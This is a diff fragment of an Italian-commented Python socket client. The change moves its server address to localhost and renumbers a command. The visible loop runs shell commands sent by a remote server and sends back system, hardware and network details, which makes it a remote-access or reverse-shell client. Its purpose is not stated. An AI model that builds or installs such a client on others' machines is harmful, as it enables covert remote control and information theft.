@@ -2,10 +2,10 @@ from socket import *
 from datetime import datetime
 from uuid import getnode as get_mac
 import os, platform, subprocess, re, time
-import psutil #verificare funzionamento su linux e mac
+import psutil
 
 BUFFER_SIZE = 1024 * 128
-serverName = '192.168.1.102'
+serverName = 'localhost'
 serverPort = 12003
 clientSocket = socket(AF_INET, SOCK_STREAM)
 def connessione():
@@ -240,7 +240,7 @@ while True:
         invia_messaggio(getNetworkInfo())
     elif comando.split('<sep>')[0] == "7":
         executeShellCommand(comando.split('<sep>')[1])
-    elif comando == "8":
+    elif comando == "9":
         riepilogo_informazioni = str(getSystemInfo()+getCPUInfo()+getBootTimeInfo()+getMemoryInfo()+getDiskInfo()+getNetworkInfo())
         invia_messaggio(riepilogo_informazioni)
     elif comando == "0":
